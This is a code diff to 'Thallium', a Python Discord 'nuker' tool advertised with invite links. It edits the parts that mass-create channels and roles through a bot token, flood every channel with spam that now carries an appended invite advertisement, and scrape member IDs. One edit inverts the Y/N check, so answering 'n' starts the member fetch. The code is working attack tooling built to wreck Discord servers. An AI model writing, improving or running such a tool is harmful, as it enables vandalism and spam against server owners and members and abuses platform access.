@@ -42,7 +42,7 @@ Thallium_art = """
        {}    ██║   ██║  ██║██║  ██║███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║
        {}    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
       {} =============================== NT ==================================
-      {}   NUKERS TERRITORY| Aizer On Top discord.gg/ntop
+      {}   NUKERS TERRITORY| Aizer On Top discord.gg/ntontop
       {} =============================== NT =================================={}
 """.format("\x1b[38;5;122m", "\x1b[38;5;122m", "\x1b[38;5;122m", "\x1b[38;5;122m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[38;5;83m", "\x1b[38;5;122m", "\x1b[0m")
 options = """
@@ -278,7 +278,7 @@ class Thallium:
         
         if ans in ["1", "01"]:
             scrape = input("{}({}Thallium{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
-            if scrape.lower() == "y":
+            if scrape.lower() == "n":
                 try:
                     guild = __client__.get_guild(int(guildid))
                     with open("fetched/members.txt", "w") as a:
@@ -323,10 +323,11 @@ class Thallium:
         elif ans in ["4", "04"]:
             type = input("{}({}Thallium{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
             type = 2 if type == "v" else 0
+            chaizer = (input("{}({}Thallium{}) Channles Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
             amount = int(input("{}({}Thallium{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
             self.channels.clear()
             for i in range(amount):
-                t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(chaizer), type, token))
+                t = threading.Thread(target=self.execute_crechannels, args=(guildid, (chaizer), type, token))
                 t.start()
                 while threading.active_count() >= __threads__:
                     t.join()
@@ -337,11 +338,11 @@ class Thallium:
             self.menu()
             
         elif ans in ["5", "05"]:
+            raizer = (input("{}({}Thallium{}) Role Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
             amount = int(input("{}({}Thallium{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
-            chaizer = (input("{}({}Thallium{}) Channel Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
             self.roles.clear()
             for i in range(amount):
-                t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(chaizer), token))
+                t = threading.Thread(target=self.execute_creroles, args=(guildid, (raizer), token))
                 t.start()
                 while threading.active_count() >= __threads__:
                     t.join()
@@ -396,7 +397,8 @@ class Thallium:
         elif ans in ["9", "09"]:
             self.messages.clear(); self.channels.clear()
             amount = int(input("{}({}Thallium{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
-            Aizer = (input("{}({}Thallium{}) Contant{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
+            Aizer1 = (input("{}({}Thallium{}) Contant{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
+            Aizer = Aizer1 + ('\n **Thallium Nuker Runs Cord ** https://discord.gg/ntontontop')
             channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
             for channel in channels: self.channels.append(channel['id'])
             channelz = cycle(self.channels)
@@ -428,7 +430,7 @@ class Thallium:
     
         
         elif ans == "11":
-            print("Developed By Nt development | Developed By Aizer  || Join :- Nt https://discord.gg/ntop || You-tube :-  https://youtube.com/@nukersop")
+            print("Developed By Nt development | Developed By Aizer  || Join :- Nt https://discord.gg/ntontop || You-tube :-  https://youtube.com/@nukersop")
             input("")
             self.menu()
         
